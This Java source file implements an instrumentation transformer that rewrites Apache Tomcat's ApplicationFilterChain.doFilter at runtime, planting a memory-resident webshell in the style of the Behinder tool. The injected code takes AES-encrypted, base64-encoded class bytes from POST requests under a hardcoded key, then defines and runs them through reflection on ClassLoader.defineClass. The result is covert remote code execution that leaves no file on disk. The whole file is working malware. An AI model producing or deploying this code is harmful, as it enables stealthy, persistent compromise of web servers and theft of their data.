package com.zpchcbd.mem;

import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class BehindTransformer implements ClassFileTransformer {
    public static String CLASS_NAME = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String METHOD_NAME = "doFilter";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        className = className.replace('/', '.');

        if (className.equals(CLASS_NAME)) {
            ClassPool cp = ClassPool.getDefault();
            if (classBeingRedefined != null) {
                ClassClassPath classPath = new ClassClassPath(classBeingRedefined);
                cp.insertClassPath(classPath);
            }

            CtClass cc;

            try {
                cc = cp.get(className);
                CtMethod m = cc.getDeclaredMethod(METHOD_NAME);
                m.insertBefore("javax.servlet.http.HttpServletRequest request = request;\n" +
                        "javax.servlet.http.HttpServletResponse response = response;\n" +
                        "javax.servlet.http.HttpSession session = request.getSession();\n" +
                        "java.util.HashMap pageContext = new java.util.HashMap();\n" +
                        "pageContext.put(\"session\", session);\n" +
                        "pageContext.put(\"request\", request);\n" +
                        "pageContext.put(\"response\", response);\n" +
                        "String cmd = request.getParameter(\"cmd\");\n" +
                        "if (cmd != null) {\n" +
                        "if (request.getMethod().equals(\"POST\")) {\n" +
                        "   String k = \"e45e329feb5d925b\";\n" +
                        "   session.putValue(\"u\", k);\n" +
                        "   javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
                        "   c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\"));\n" +
                        "   Class clazz = java.lang.Class.forName(\"java.lang.ClassLoader\");\n" +
                        "   java.lang.reflect.Method method = clazz.getDeclaredMethod(\"defineClass\", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE});\n" +
                        "   method.setAccessible(true);\n" +
                        "   byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));\n" +
                        "   Class evilclass = (Class)method.invoke(java.lang.ClassLoader.getSystemClassLoader(), new Object[]{evilclass_byte, new java.lang.Integer(0), new java.lang.Integer(evilclass_byte.length)});\n" +
                        "   evilclass.newInstance().equals(pageContext);\n" +
                        "}\n" +
                        "}");
                byte[] byteCode = cc.toBytecode();
                cc.detach();
                return byteCode;
            } catch (NotFoundException | IOException | CannotCompileException e) {
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}